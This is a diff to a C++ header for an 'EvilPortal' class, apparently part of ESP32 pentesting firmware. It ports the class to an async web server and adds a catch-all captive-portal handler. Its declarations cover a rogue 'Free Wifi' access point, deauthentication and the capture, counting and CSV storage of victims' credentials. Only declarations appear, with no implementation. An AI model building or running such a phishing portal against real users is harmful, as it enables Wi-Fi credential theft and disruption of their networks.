@@ -2,10 +2,23 @@
 #define __EVIL_PORTAL_H__
 
 #include <DNSServer.h>
-#include <WebServer.h>
+#include <ESPAsyncWebServer.h>
 #include <globals.h>
 
 class EvilPortal {
+    class CaptiveRequestHandler : public AsyncWebHandler {
+    public:
+        CaptiveRequestHandler(EvilPortal *portal) : _portal(portal) {}
+        virtual ~CaptiveRequestHandler() { _portal = nullptr; }
+        bool canHandle(AsyncWebServerRequest *request) {
+            return true;
+        }; // request->addInterestingHeader("ANY");
+        void handleRequest(AsyncWebServerRequest *request);
+
+    private:
+        EvilPortal *_portal;
+    };
+
 public:
     /////////////////////////////////////////////////////////////////////////////////////
     // Constructor
@@ -25,8 +38,9 @@ private:
     String apName = "Free Wifi";
     uint8_t _channel;
     bool _deauth;
-    bool _verifyPwd;  // From PR branch
-    WebServer webServer;
+    bool isDeauthHeld = false;
+    bool _verifyPwd; // From PR branch
+    AsyncWebServer webServer;
 
     DNSServer dnsServer;
     IPAddress apGateway;
@@ -36,28 +50,28 @@ private:
     String htmlPage;
     String htmlFileName;
     bool isDefaultHtml = true;
-    bool temp_stop = false;
     FS *fsHtmlFile;
 
     String lastCred;
     int totalCapturedCredentials = 0;
     int previousTotalCapturedCredentials = -1;
     String capturedCredentialsHtml = "";
+    bool verifyPass = false;
 
-    void portalController(void);
-    void credsController();
+    void portalController(AsyncWebServerRequest *request);
+    void credsController(AsyncWebServerRequest *request);
+
     bool verifyCreds(String &Ssid, String &Password);
-    void restartWiFi(bool reset=true);
+    void restartWiFi(bool reset = true);
     void resetCapturedCredentials(void);
-    void printDeauthStatus(bool);
+    void printDeauthStatus(void);
     void printLastCapturedCredential(void);
-    void debounceButtonPress(void);
     void loadCustomHtml(void);
     void loadDefaultHtml(void);
     void loadDefaultHtml_one(void);
     String wifiLoadPage(void);
     void saveToCSV(const String &csvLine, bool IsAPname = false);
-    void drawScreen(bool holdDeauth);
+    void drawScreen(void);
 
     String getHtmlTemplate(String body);
     String creds_GET(void);
